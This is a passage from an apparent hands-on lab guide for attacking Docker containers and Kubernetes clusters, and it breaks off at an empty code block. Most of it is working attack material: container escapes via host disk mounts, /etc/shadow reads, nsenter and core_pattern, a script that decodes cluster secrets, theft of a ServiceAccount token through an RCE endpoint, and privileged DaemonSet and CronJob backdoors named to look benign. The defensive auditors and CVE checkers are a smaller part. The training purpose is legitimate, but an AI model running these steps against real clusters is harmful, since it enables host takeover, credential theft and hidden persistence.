# Load kernel module (absolute host compromise)
# This requires a .ko compiled for the host kernel
# Demonstrating the capability check:
cat /proc/sys/kernel/modules_disabled
```

#### Step 4 — Device access exploitation

```bash
docker exec -it docker-lab sh

# Container with specific device access
docker run -d --name dev-victim \
  --device /dev/sda:/dev/sda \
  victim:latest sleep infinity

docker exec -it dev-victim bash

# Inside: mount the host's disk directly
mount /dev/sda1 /mnt 2>/dev/null
cat /mnt/etc/shadow
```

#### Step 5 — Build container capability auditor

Save as `container_cap_auditor.py`:

```python
#!/usr/bin/env python3
"""Audit container capabilities and identify escape paths."""

import json
import subprocess
import os
from pathlib import Path


DANGEROUS_CAPS = {
    "CAP_SYS_ADMIN": {
        "risk": "CRITICAL",
        "escapes": ["cgroup release_agent (CVE-2022-0492)", "unshare+mount namespace", "BPF program loading"],
    },
    "CAP_SYS_PTRACE": {
        "risk": "CRITICAL",
        "escapes": ["ptrace host processes (with hostPID)", "inject into host process memory", "read /proc/<pid>/mem"],
    },
    "CAP_SYS_MODULE": {
        "risk": "CRITICAL",
        "escapes": ["load malicious kernel module", "rootkit installation"],
    },
    "CAP_NET_ADMIN": {
        "risk": "HIGH",
        "escapes": ["modify iptables (bypass sidecar proxy)", "ARP spoofing", "nftables exploitation"],
    },
    "CAP_DAC_READ_SEARCH": {
        "risk": "HIGH",
        "escapes": ["read any file on host via open_by_handle_at", "bypass file permission checks"],
    },
    "CAP_SYS_RAWIO": {
        "risk": "HIGH",
        "escapes": ["direct I/O to devices", "read/write physical memory"],
    },
    "CAP_NET_RAW": {
        "risk": "MEDIUM",
        "escapes": ["packet sniffing", "ARP spoofing", "ICMP tunneling"],
    },
}


def get_capabilities() -> dict:
    """Parse /proc/self/status for capability bitmasks."""
    caps = {}
    try:
        with open("/proc/self/status") as f:
            for line in f:
                if line.startswith("Cap"):
                    key, val = line.strip().split(":\t")
                    caps[key] = int(val, 16)
    except FileNotFoundError:
        pass
    return caps


def decode_cap_bitmask(bitmask: int) -> list[str]:
    """Decode a capability bitmask into capability names."""
    cap_names = [
        "CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_FOWNER",
        "CAP_FSETID", "CAP_KILL", "CAP_SETGID", "CAP_SETUID", "CAP_SETPCAP",
        "CAP_LINUX_IMMUTABLE", "CAP_NET_BIND_SERVICE", "CAP_NET_BROADCAST",
        "CAP_NET_ADMIN", "CAP_NET_RAW", "CAP_IPC_LOCK", "CAP_IPC_OWNER",
        "CAP_SYS_MODULE", "CAP_SYS_RAWIO", "CAP_SYS_CHROOT", "CAP_SYS_PTRACE",
        "CAP_SYS_PACCT", "CAP_SYS_ADMIN", "CAP_SYS_BOOT", "CAP_SYS_NICE",
        "CAP_SYS_RESOURCE", "CAP_SYS_TIME", "CAP_SYS_TTY_CONFIG", "CAP_MKNOD",
        "CAP_LEASE", "CAP_AUDIT_WRITE", "CAP_AUDIT_CONTROL", "CAP_SETFCAP",
        "CAP_MAC_OVERRIDE", "CAP_MAC_ADMIN", "CAP_SYSLOG", "CAP_WAKE_ALARM",
        "CAP_BLOCK_SUSPEND", "CAP_AUDIT_READ", "CAP_PERFMON", "CAP_BPF",
        "CAP_CHECKPOINT_RESTORE",
    ]
    result = []
    for i, name in enumerate(cap_names):
        if bitmask & (1 << i):
            result.append(name)
    return result


def check_namespace_isolation() -> dict:
    """Check if container shares namespaces with host."""
    results = {}

    try:
        container_pid_ns = os.readlink("/proc/1/ns/pid")
        self_pid_ns = os.readlink("/proc/self/ns/pid")
        results["pid_namespace_shared"] = container_pid_ns == self_pid_ns

        init_cmdline = Path("/proc/1/cmdline").read_text().replace("\x00", " ").strip()
        results["init_process"] = init_cmdline
        results["host_pid_likely"] = "systemd" in init_cmdline or "init" in init_cmdline
    except Exception:
        pass

    try:
        with open("/proc/1/cgroup") as f:
            cgroup_content = f.read()
            results["in_container"] = "docker" in cgroup_content or "kubepods" in cgroup_content or "containerd" in cgroup_content
    except Exception:
        pass

    results["docker_socket_mounted"] = os.path.exists("/var/run/docker.sock")
    results["privileged_mode"] = os.path.exists("/dev/sda") or os.path.exists("/dev/vda")

    return results


def check_seccomp() -> str:
    """Check seccomp enforcement status."""
    try:
        with open("/proc/self/status") as f:
            for line in f:
                if line.startswith("Seccomp:"):
                    val = int(line.split(":")[1].strip())
                    return {0: "disabled", 1: "strict", 2: "filter"}.get(val, "unknown")
    except Exception:
        return "unknown"


def check_apparmor() -> str:
    """Check AppArmor confinement."""
    try:
        profile = Path("/proc/self/attr/current").read_text().strip()
        return profile if profile else "unconfined"
    except Exception:
        return "unknown"


def check_writable_sensitive_paths() -> list[str]:
    """Check for writable sensitive host paths."""
    sensitive = [
        "/proc/sys/kernel/core_pattern",
        "/sys/fs/cgroup",
        "/proc/sysrq-trigger",
        "/sys/kernel/security",
        "/dev/mem",
    ]
    writable = []
    for path in sensitive:
        if os.path.exists(path) and os.access(path, os.W_OK):
            writable.append(path)
    return writable


def audit():
    """Run full container security audit."""
    print("=" * 60)
    print("  CONTAINER CAPABILITY & ISOLATION AUDIT")
    print("=" * 60)

    # Capabilities
    caps = get_capabilities()
    eff_caps = decode_cap_bitmask(caps.get("CapEff", 0))
    print(f"\n[Effective Capabilities] ({len(eff_caps)} total)")
    for cap in eff_caps:
        if cap in DANGEROUS_CAPS:
            info = DANGEROUS_CAPS[cap]
            print(f"  \033[91m[{info['risk']}]\033[0m {cap}")
            for esc in info["escapes"]:
                print(f"    → Escape path: {esc}")
        else:
            print(f"  [OK] {cap}")

    # Check for ALL capabilities (privileged mode)
    all_caps_mask = (1 << 41) - 1
    if caps.get("CapEff", 0) == all_caps_mask or len(eff_caps) > 35:
        print(f"\n  \033[91m[CRITICAL] ALL CAPABILITIES GRANTED — likely --privileged\033[0m")

    # Namespace isolation
    ns = check_namespace_isolation()
    print(f"\n[Namespace Isolation]")
    for key, val in ns.items():
        status = "\033[91mDANGER\033[0m" if val and "shared" in key or val and "host" in key or val and "socket" in key or val and "privileged" in key else "\033[92mOK\033[0m"
        print(f"  {key}: {val} [{status}]")

    # Seccomp
    seccomp = check_seccomp()
    color = "\033[91m" if seccomp == "disabled" else "\033[92m"
    print(f"\n[Seccomp] {color}{seccomp}\033[0m")

    # AppArmor
    apparmor = check_apparmor()
    color = "\033[91m" if apparmor == "unconfined" else "\033[92m"
    print(f"[AppArmor] {color}{apparmor}\033[0m")

    # Writable sensitive paths
    writable = check_writable_sensitive_paths()
    print(f"\n[Writable Sensitive Paths]")
    if writable:
        for path in writable:
            print(f"  \033[91m[WRITABLE]\033[0m {path}")
    else:
        print("  \033[92mNone found\033[0m")

    # Summary
    print(f"\n{'=' * 60}")
    dangerous_count = sum(1 for c in eff_caps if c in DANGEROUS_CAPS)
    if dangerous_count > 0 or ns.get("docker_socket_mounted") or ns.get("privileged_mode"):
        print(f"  \033[91mVERDICT: CONTAINER ESCAPE LIKELY POSSIBLE\033[0m")
        print(f"  Dangerous capabilities: {dangerous_count}")
        if ns.get("docker_socket_mounted"):
            print(f"  Docker socket: MOUNTED (instant host root)")
        if ns.get("host_pid_likely"):
            print(f"  Host PID namespace: SHARED (nsenter escape)")
    else:
        print(f"  \033[92mVERDICT: No obvious escape paths detected\033[0m")
    print(f"{'=' * 60}")


if __name__ == "__main__":
    audit()
```

**Verification.** Run inside containers with various capability configurations. Confirm it correctly identifies `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, Docker socket mounts, and seccomp status.

---

### Exercise 3: Container Escape — nsenter, core_pattern, and runc CVEs

**Objective.** Demonstrate three additional container escape vectors and build detection for each.

#### Step 1 — nsenter with host PID namespace

```bash
docker exec -it docker-lab sh

# Container with hostPID
docker run -d --name nsenter-victim --pid=host victim:latest sleep infinity
docker exec -it nsenter-victim bash
```

Inside:

```bash
# Verify host PID namespace — PID 1 is the host's init, not container's
ps aux | head -5
cat /proc/1/cmdline | tr '\0' ' '

# Enter ALL host namespaces via PID 1
nsenter -t 1 -m -u -i -n -p -- /bin/bash

# Now in host context
hostname
id
cat /etc/os-release
ip addr
```

#### Step 2 — core_pattern escape

```bash
docker exec -it docker-lab sh

# Container with writable /proc/sys (requires --privileged or specific mount)
docker run -d --name core-victim \
  --privileged \
  victim:latest sleep infinity

docker exec -it core-victim bash
```

Inside:

```bash
# Check if core_pattern is writable
cat /proc/sys/kernel/core_pattern
echo "test" > /proc/sys/kernel/core_pattern 2>/dev/null && echo "WRITABLE!" || echo "Read-only (mitigated)"

# If writable — set up the escape
# Step 1: Find container overlay path on host
host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)

# Step 2: Write the payload script
cat > /payload.sh << 'EOF'
#!/bin/sh
id > /tmp/core_escape_proof
hostname >> /tmp/core_escape_proof
date -u +"%Y-%m-%dT%H:%M:%SZ" >> /tmp/core_escape_proof
EOF
chmod +x /payload.sh

# Step 3: Set core_pattern to pipe to our payload on the HOST path
echo "|${host_path}/payload.sh" > /proc/sys/kernel/core_pattern

# Step 4: Trigger a core dump (segfault)
bash -c 'kill -SIGSEGV $$' 2>/dev/null

# Step 5: Check for escape proof
sleep 1
cat /tmp/core_escape_proof 2>/dev/null
```

#### Step 3 — CVE-2024-21626 (Leaky Vessels) detection

```bash
# Check runc version for vulnerability
docker exec docker-lab runc --version

# Build a detection script
cat > check_leaky_vessels.sh << 'SCRIPT'
#!/bin/bash
echo "[*] Checking for CVE-2024-21626 (Leaky Vessels)"

RUNC_VERSION=$(runc --version 2>/dev/null | grep "runc version" | awk '{print $3}')
if [ -z "$RUNC_VERSION" ]; then
    echo "  [?] runc not found in PATH"
    exit 1
fi

echo "  runc version: $RUNC_VERSION"

# Compare version — vulnerable if < 1.1.12
MAJOR=$(echo "$RUNC_VERSION" | cut -d. -f1)
MINOR=$(echo "$RUNC_VERSION" | cut -d. -f2)
PATCH=$(echo "$RUNC_VERSION" | cut -d. -f3)

if [ "$MAJOR" -eq 1 ] && [ "$MINOR" -eq 1 ] && [ "$PATCH" -lt 12 ]; then
    echo "  [CRITICAL] VULNERABLE to CVE-2024-21626"
    echo "  Upgrade runc to >= 1.1.12"
elif [ "$MAJOR" -eq 1 ] && [ "$MINOR" -lt 1 ]; then
    echo "  [CRITICAL] VULNERABLE to CVE-2024-21626"
else
    echo "  [OK] Patched against CVE-2024-21626"
fi

echo ""
echo "[*] Checking for CVE-2019-5736 (runc /proc/self/exe overwrite)"
if [ "$MAJOR" -eq 1 ] && [ "$MINOR" -eq 0 ] && [ "$PATCH" -lt 0 ]; then
    echo "  [CRITICAL] VULNERABLE"
else
    echo "  [OK] Patched (runc >= 1.0.0-rc6)"
fi
SCRIPT
chmod +x check_leaky_vessels.sh
```

**Expected output.** `nsenter` escape gives full host shell. `core_pattern` escape executes arbitrary commands as host root. CVE check identifies vulnerable runc versions.

---

### Exercise 4: Kubernetes API Reconnaissance and Anonymous Access

**Objective.** Probe the Kubernetes API server for anonymous access, enumerate cluster resources, and extract secrets.

#### Step 1 — External API server probing

```bash
export KUBECONFIG="$(pwd)/kubeconfig/kubeconfig.yaml"

# Probe for anonymous access (lab has --anonymous-auth=true)
curl -sk https://172.20.0.10:6443/api/v1/namespaces | jq '.items[].metadata.name'
curl -sk https://172.20.0.10:6443/version | jq .
curl -sk https://172.20.0.10:6443/api/v1/pods | jq '.items | length'
curl -sk https://172.20.0.10:6443/api/v1/nodes | jq '.items[].metadata.name'

# Enumerate secrets (if RBAC allows anonymous)
curl -sk https://172.20.0.10:6443/api/v1/namespaces/production/secrets | jq '.items[].metadata.name'
```

#### Step 2 — ServiceAccount token extraction from compromised pod

```bash
# Exec into attacker pod
kubectl exec -it -n attacker attacker -- bash

# Extract the mounted ServiceAccount token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"

echo "[*] Token: ${TOKEN:0:50}..."
echo "[*] API Server: $APISERVER"

# Check what permissions this token has
curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -X POST -H "Content-Type: application/json" \
  -d '{
    "apiVersion": "authorization.k8s.io/v1",
    "kind": "SelfSubjectAccessReview",
    "spec": {
      "resourceAttributes": {
        "verb": "list",
        "resource": "pods",
        "namespace": "attacker"
      }
    }
  }' | jq '.status.allowed'

# Enumerate pods in our namespace
curl -sk --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/attacker/pods" | jq '.items[].metadata.name'
```

#### Step 3 — Discover the vulnerable app and pivot to its ServiceAccount

```bash
# Inside attacker pod — find services in other namespaces via DNS
for ns in default production kube-system; do
  for svc in vuln-app postgres web api dashboard; do
    nslookup $svc.$ns.svc.cluster.local 2>/dev/null | grep -q "Address" && \
      echo "[+] Found: $svc.$ns.svc.cluster.local"
  done
done

# Access the vulnerable app (SSRF/RCE endpoint)
curl -s http://vuln-app.production.svc.cluster.local:8080/healthz

# Use the RCE endpoint to extract the vuln-app's SA token
curl -s http://vuln-app.production.svc.cluster.local:8080/api/exec \
  -H "Content-Type: application/json" \
  -d '{"cmd": "cat /var/run/secrets/kubernetes.io/serviceaccount/token"}' | jq -r '.stdout'
```

#### Step 4 — Build Kubernetes API recon tool

Save as `k8s_recon.py`:

```python
#!/usr/bin/env python3
"""Kubernetes API reconnaissance tool — enumerates cluster resources,
RBAC permissions, and sensitive data from a compromised pod context."""

import json
import os
import ssl
import urllib.request
from typing import Optional


class K8sRecon:
    """Kubernetes API client using in-cluster ServiceAccount credentials."""

    def __init__(self, token: Optional[str] = None, api_server: Optional[str] = None):
        sa_path = "/var/run/secrets/kubernetes.io/serviceaccount"

        if token:
            self.token = token
        else:
            with open(f"{sa_path}/token") as f:
                self.token = f.read().strip()

        if api_server:
            self.api_server = api_server
        else:
            host = os.environ.get("KUBERNETES_SERVICE_HOST", "kubernetes.default.svc")
            port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
            self.api_server = f"https://{host}:{port}"

        self.namespace = "default"
        try:
            with open(f"{sa_path}/namespace") as f:
                self.namespace = f.read().strip()
        except FileNotFoundError:
            pass

        self.ssl_ctx = ssl.create_default_context()
        ca_path = f"{sa_path}/ca.crt"
        if os.path.exists(ca_path):
            self.ssl_ctx.load_verify_locations(ca_path)
        else:
            self.ssl_ctx.check_hostname = False
            self.ssl_ctx.verify_mode = ssl.CERT_NONE

        self.findings = []

    def _api_call(self, path: str, method: str = "GET", body: Optional[dict] = None) -> dict:
        url = f"{self.api_server}{path}"
        headers = {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/json",
        }
        data = json.dumps(body).encode() if body else None
        req = urllib.request.Request(url, data=data, headers=headers, method=method)
        try:
            with urllib.request.urlopen(req, context=self.ssl_ctx, timeout=5) as resp:
                return json.loads(resp.read().decode())
        except urllib.error.HTTPError as e:
            return {"error": e.code, "reason": e.reason}
        except Exception as e:
            return {"error": str(e)}

    def check_permission(self, verb: str, resource: str, namespace: str = "") -> bool:
        body = {
            "apiVersion": "authorization.k8s.io/v1",
            "kind": "SelfSubjectAccessReview",
            "spec": {
                "resourceAttributes": {
                    "verb": verb,
                    "resource": resource,
                }
            }
        }
        if namespace:
            body["spec"]["resourceAttributes"]["namespace"] = namespace

        result = self._api_call(
            "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews",
            method="POST",
            body=body,
        )
        return result.get("status", {}).get("allowed", False)

    def enumerate_permissions(self) -> list[dict]:
        """Check common permissions across critical resources."""
        resources = [
            "pods", "pods/exec", "secrets", "configmaps", "services",
            "deployments", "daemonsets", "cronjobs", "serviceaccounts",
            "clusterroles", "clusterrolebindings", "roles", "rolebindings",
            "nodes", "namespaces", "persistentvolumes",
        ]
        verbs = ["get", "list", "create", "delete", "update", "patch"]
        permissions = []

        for resource in resources:
            allowed_verbs = []
            for verb in verbs:
                if self.check_permission(verb, resource):
                    allowed_verbs.append(verb)
            if allowed_verbs:
                permissions.append({"resource": resource, "verbs": allowed_verbs})
                self.findings.append({
                    "type": "RBAC_PERMISSION",
                    "severity": "HIGH" if resource in ("secrets", "pods/exec", "clusterrolebindings") else "INFO",
                    "resource": resource,
                    "verbs": allowed_verbs,
                })
        return permissions

    def enumerate_namespaces(self) -> list[str]:
        result = self._api_call("/api/v1/namespaces")
        if "error" in result:
            return [self.namespace]
        ns_list = [item["metadata"]["name"] for item in result.get("items", [])]
        self.findings.append({
            "type": "NAMESPACE_ENUMERATION",
            "severity": "INFO",
            "namespaces": ns_list,
        })
        return ns_list

    def extract_secrets(self, namespace: str = "") -> list[dict]:
        ns = namespace or self.namespace
        result = self._api_call(f"/api/v1/namespaces/{ns}/secrets")
        if "error" in result:
            return []

        secrets = []
        for item in result.get("items", []):
            secret_data = {}
            for key, val in item.get("data", {}).items():
                import base64
                try:
                    decoded = base64.b64decode(val).decode("utf-8", errors="replace")
                    secret_data[key] = decoded
                except Exception:
                    secret_data[key] = "<binary>"

            secret_info = {
                "name": item["metadata"]["name"],
                "namespace": ns,
                "type": item.get("type", "Opaque"),
                "keys": list(item.get("data", {}).keys()),
                "decoded_data": secret_data,
            }
            secrets.append(secret_info)
            self.findings.append({
                "type": "SECRET_EXTRACTED",
                "severity": "CRITICAL",
                "name": secret_info["name"],
                "namespace": ns,
                "keys": secret_info["keys"],
            })
        return secrets

    def enumerate_pods(self, namespace: str = "") -> list[dict]:
        path = f"/api/v1/namespaces/{namespace}/pods" if namespace else "/api/v1/pods"
        result = self._api_call(path)
        if "error" in result:
            return []

        pods = []
        for item in result.get("items", []):
            spec = item.get("spec", {})
            containers = spec.get("containers", [])

            pod_info = {
                "name": item["metadata"]["name"],
                "namespace": item["metadata"]["namespace"],
                "service_account": spec.get("serviceAccountName", "default"),
                "host_pid": spec.get("hostPID", False),
                "host_network": spec.get("hostNetwork", False),
                "host_ipc": spec.get("hostIPC", False),
                "containers": [],
            }

            for c in containers:
                sec_ctx = c.get("securityContext", {})
                container_info = {
                    "name": c["name"],
                    "image": c["image"],
                    "privileged": sec_ctx.get("privileged", False),
                    "run_as_root": not sec_ctx.get("runAsNonRoot", False),
                    "read_only_root": sec_ctx.get("readOnlyRootFilesystem", False),
                    "caps_add": sec_ctx.get("capabilities", {}).get("add", []),
                    "caps_drop": sec_ctx.get("capabilities", {}).get("drop", []),
                }
                pod_info["containers"].append(container_info)

                if container_info["privileged"]:
                    self.findings.append({
                        "type": "PRIVILEGED_POD",
                        "severity": "CRITICAL",
                        "pod": pod_info["name"],
                        "namespace": pod_info["namespace"],
                        "container": c["name"],
                    })

            if pod_info["host_pid"] or pod_info["host_network"]:
                self.findings.append({
                    "type": "HOST_NAMESPACE_POD",
                    "severity": "CRITICAL",
                    "pod": pod_info["name"],
                    "namespace": pod_info["namespace"],
                    "host_pid": pod_info["host_pid"],
                    "host_network": pod_info["host_network"],
                })

            pods.append(pod_info)
        return pods

    def find_cluster_admin_bindings(self) -> list[dict]:
        result = self._api_call("/apis/rbac.authorization.k8s.io/v1/clusterrolebindings")
        if "error" in result:
            return []

        admin_bindings = []
        for item in result.get("items", []):
            role_ref = item.get("roleRef", {})
            if role_ref.get("name") == "cluster-admin":
                subjects = item.get("subjects", [])
                binding = {
                    "name": item["metadata"]["name"],
                    "subjects": [
                        {"kind": s.get("kind"), "name": s.get("name"), "namespace": s.get("namespace")}
                        for s in subjects
                    ],
                }
                admin_bindings.append(binding)
                self.findings.append({
                    "type": "CLUSTER_ADMIN_BINDING",
                    "severity": "CRITICAL",
                    "binding": item["metadata"]["name"],
                    "subjects": binding["subjects"],
                })
        return admin_bindings

    def check_env_secrets(self) -> list[dict]:
        """Check if env vars contain secrets via /proc/self/environ."""
        leaked = []
        sensitive_patterns = ["PASSWORD", "SECRET", "TOKEN", "KEY", "CREDENTIAL", "STRIPE", "AWS_"]
        try:
            environ = open("/proc/self/environ").read().split("\x00")
            for env in environ:
                if "=" in env:
                    name = env.split("=", 1)[0]
                    for pattern in sensitive_patterns:
                        if pattern in name.upper():
                            leaked.append({
                                "name": name,
                                "value_preview": env.split("=", 1)[1][:12] + "...",
                                "source": "/proc/self/environ",
                            })
                            self.findings.append({
                                "type": "ENV_SECRET_LEAKED",
                                "severity": "HIGH",
                                "env_name": name,
                            })
                            break
        except Exception:
            pass
        return leaked

    def report(self):
        print("\n" + "=" * 70)
        print("  KUBERNETES CLUSTER RECONNAISSANCE REPORT")
        print("=" * 70)

        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "INFO": 3}
        sorted_findings = sorted(self.findings, key=lambda f: severity_order.get(f["severity"], 99))

        crit = sum(1 for f in self.findings if f["severity"] == "CRITICAL")
        high = sum(1 for f in self.findings if f["severity"] == "HIGH")
        print(f"\n  Total findings: {len(self.findings)} | CRITICAL: {crit} | HIGH: {high}")

        for finding in sorted_findings:
            sev = finding["severity"]
            ftype = finding["type"]
            details = {k: v for k, v in finding.items() if k not in ("type", "severity")}
            color = {"CRITICAL": "\033[91m", "HIGH": "\033[93m", "INFO": "\033[36m"}.get(sev, "")
            print(f"\n  {color}[{sev}]\033[0m {ftype}")
            for k, v in details.items():
                if isinstance(v, list) and len(v) > 5:
                    print(f"    {k}: [{len(v)} items] {v[:3]}...")
                else:
                    print(f"    {k}: {v}")


def main():
    recon = K8sRecon()
    print("[*] Starting Kubernetes reconnaissance...")

    print("[*] Enumerating namespaces...")
    recon.enumerate_namespaces()

    print("[*] Checking RBAC permissions...")
    recon.enumerate_permissions()

    print("[*] Enumerating pods across accessible namespaces...")
    recon.enumerate_pods()

    print("[*] Extracting secrets...")
    for ns in recon.enumerate_namespaces():
        recon.extract_secrets(ns)

    print("[*] Finding cluster-admin bindings...")
    recon.find_cluster_admin_bindings()

    print("[*] Checking environment variable leaks...")
    recon.check_env_secrets()

    recon.report()


if __name__ == "__main__":
    main()
```

**Verification.** Run from inside the attacker pod (`kubectl cp k8s_recon.py attacker/attacker:/tmp/` then `kubectl exec -n attacker attacker -- python3 /tmp/k8s_recon.py`). Confirm it discovers the overprivileged SA binding, extracts secrets from production namespace, and identifies pods with dangerous security contexts.

---

### Exercise 5: RBAC Privilege Escalation — Create Pod to Cluster-Admin

**Objective.** Escalate from limited RBAC permissions to cluster-admin by exploiting `create pods` access.

#### Step 1 — Verify attacker's limited permissions

```bash
# From the attacker pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"

# Check permissions in attacker namespace (should have create pods)
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"attacker"}}' \
  | jq '.status.resourceRules[]'
```

#### Step 2 — Exploit the vuln-app's overprivileged SA

```bash
# The vuln-app in production namespace uses overprivileged-sa (cluster-admin)
# Use the vuln-app's RCE to extract its SA token
STOLEN_TOKEN=$(curl -s http://vuln-app.production.svc.cluster.local:8080/api/exec \
  -H "Content-Type: application/json" \
  -d '{"cmd": "cat /var/run/secrets/kubernetes.io/serviceaccount/token"}' | jq -r '.stdout')

echo "[*] Stolen token: ${STOLEN_TOKEN:0:50}..."

# Verify the stolen token has cluster-admin
curl -sk -H "Authorization: Bearer $STOLEN_TOKEN" \
  "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"*","resource":"*"}}}' \
  | jq '.status.allowed'
# Expected: true — full cluster-admin
```

#### Step 3 — Use stolen token to extract all secrets cluster-wide

```bash
# List all secrets across all namespaces
curl -sk -H "Authorization: Bearer $STOLEN_TOKEN" \
  "$APISERVER/api/v1/secrets" | jq '.items[] | {ns: .metadata.namespace, name: .metadata.name, type: .type}'

# Decode specific secrets
curl -sk -H "Authorization: Bearer $STOLEN_TOKEN" \
  "$APISERVER/api/v1/namespaces/production/secrets/db-credentials" | \
  jq -r '.data | to_entries[] | "\(.key): \(.value | @base64d)"'

curl -sk -H "Authorization: Bearer $STOLEN_TOKEN" \
  "$APISERVER/api/v1/namespaces/production/secrets/api-keys" | \
  jq -r '.data | to_entries[] | "\(.key): \(.value | @base64d)"'
```

#### Step 4 — Create persistent backdoor pod

```bash
# Use the cluster-admin token to create a backdoor DaemonSet
curl -sk -H "Authorization: Bearer $STOLEN_TOKEN" \
  "$APISERVER/apis/apps/v1/namespaces/kube-system/daemonsets" \
  -X POST -H "Content-Type: application/json" \
  -d '{
    "apiVersion": "apps/v1",
    "kind": "DaemonSet",
    "metadata": {
      "name": "node-health-monitor",
      "namespace": "kube-system"
    },
    "spec": {
      "selector": {
        "matchLabels": {"app": "node-health-monitor"}
      },
      "template": {
        "metadata": {
          "labels": {"app": "node-health-monitor"}
        },
        "spec": {
          "hostPID": true,
          "hostNetwork": true,
          "containers": [{
            "name": "monitor",
            "image": "alpine:3.19",
            "command": ["/bin/sh", "-c", "while true; do sleep 3600; done"],
            "securityContext": {"privileged": true},
            "volumeMounts": [{"name": "hostroot", "mountPath": "/host"}]
          }],
          "volumes": [{"name": "hostroot", "hostPath": {"path": "/"}}]
        }
      }
    }
  }'

echo "[*] DaemonSet created — persistent access on all nodes"
```

**Expected output.** Successful extraction of all cluster secrets (DB credentials, API keys), creation of a privileged DaemonSet in kube-system for node-level persistence.

---

### Exercise 6: Kubelet API Exploitation

**Objective.** Exploit the kubelet's authenticated and read-only APIs for pod enumeration, log theft, and command execution.

#### Step 1 — Probe kubelet read-only API (port 10255)

```bash
# From a machine with network access to the node
# K3s disables 10255 by default, but many clusters still have it enabled
curl -sk https://172.20.0.11:10255/pods 2>/dev/null | jq '.items | length'
# If accessible: full pod metadata including env vars, volume mounts, images
```

#### Step 2 — Probe kubelet authenticated API (port 10250)

```bash
# The kubelet API on 10250 (if anonymous auth is enabled)
curl -sk https://172.20.0.11:10250/runningpods/ | jq '.items[].metadata | {name, namespace}'

# List running pods on the node
curl -sk https://172.20.0.11:10250/pods | jq '.items[] | {name: .metadata.name, ns: .metadata.namespace}'

# Execute a command in a running container via kubelet
curl -sk https://172.20.0.11:10250/run/production/vuln-app/app \
  -X POST -d "cmd=id"

# Read container logs
curl -sk https://172.20.0.11:10250/containerLogs/production/vuln-app/app
```

#### Step 3 — Build kubelet scanner

Save as `kubelet_scanner.sh`:

```bash
#!/bin/bash
# Kubelet API Scanner — identifies exposed kubelet APIs on a subnet

SUBNET="${1:-172.20.0}"
KUBELET_PORT=10250
READONLY_PORT=10255

echo "[*] Scanning $SUBNET.0/24 for exposed kubelet APIs..."

for ip in $(seq 1 254); do
    TARGET="$SUBNET.$ip"

    # Check read-only port (10255)
    READONLY_RESULT=$(curl -sk --connect-timeout 1 "http://$TARGET:$READONLY_PORT/healthz" 2>/dev/null)
    if [ "$READONLY_RESULT" = "ok" ]; then
        echo "  [CRITICAL] $TARGET:$READONLY_PORT — Read-only kubelet API EXPOSED"
        POD_COUNT=$(curl -sk "http://$TARGET:$READONLY_PORT/pods" | jq '.items | length' 2>/dev/null)
        echo "    Pods visible: $POD_COUNT"
    fi

    # Check authenticated port (10250)
    AUTH_RESULT=$(curl -sk --connect-timeout 1 "https://$TARGET:$KUBELET_PORT/healthz" 2>/dev/null)
    if [ "$AUTH_RESULT" = "ok" ]; then
        echo "  [HIGH] $TARGET:$KUBELET_PORT — Kubelet API reachable"

        # Try anonymous access
        PODS=$(curl -sk "https://$TARGET:$KUBELET_PORT/runningpods/" 2>/dev/null)
        if echo "$PODS" | jq '.items' 2>/dev/null | grep -q "metadata"; then
            echo "    [CRITICAL] Anonymous auth ENABLED — pod listing successful"
            echo "$PODS" | jq -r '.items[].metadata | "\(.namespace)/\(.name)"' 2>/dev/null | head -5
        fi
    fi
done

echo "[*] Scan complete."
```

**Verification.** Run from a pod with network access to node IPs. Confirm it identifies kubelet API exposure on K3s nodes.

---

### Exercise 7: Kubernetes Persistence — CronJob and DaemonSet Backdoors

**Objective.** Establish persistent access in a Kubernetes cluster using CronJob, DaemonSet, and admission webhook techniques.

#### Step 1 — CronJob backdoor

```bash
# Using the stolen cluster-admin token
STOLEN_TOKEN=$(curl -s http://vuln-app.production.svc.cluster.local:8080/api/exec \
  -H "Content-Type: application/json" \
  -d '{"cmd": "cat /var/run/secrets/kubernetes.io/serviceaccount/token"}' | jq -r '.stdout')

APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"

# Create a CronJob that beacons every 5 minutes
curl -sk -H "Authorization: Bearer $STOLEN_TOKEN" \
  "$APISERVER/apis/batch/v1/namespaces/kube-system/cronjobs" \
  -X POST -H "Content-Type: application/json" \
  -d '{
    "apiVersion": "batch/v1",
    "kind": "CronJob",
    "metadata": {
      "name": "system-health-check",
      "namespace": "kube-system"
    },
    "spec": {
      "schedule": "*/5 * * * *",
      "successfulJobsHistoryLimit": 0,
      "failedJobsHistoryLimit": 0,
      "jobTemplate": {
        "spec": {
          "template": {
            "spec": {
              "serviceAccountName": "default",
              "containers": [{
                "name": "check",
                "image": "alpine:3.19",
                "command": ["/bin/sh", "-c",
                  "echo beacon-$(date +%s) > /dev/null"]
              }],
              "restartPolicy": "Never"
            }
          }
        }
      }
    }
  }'

echo "[*] CronJob backdoor created in kube-system"
```

#### Step 2 — Mutating webhook injection (supply chain backdoor)

```bash
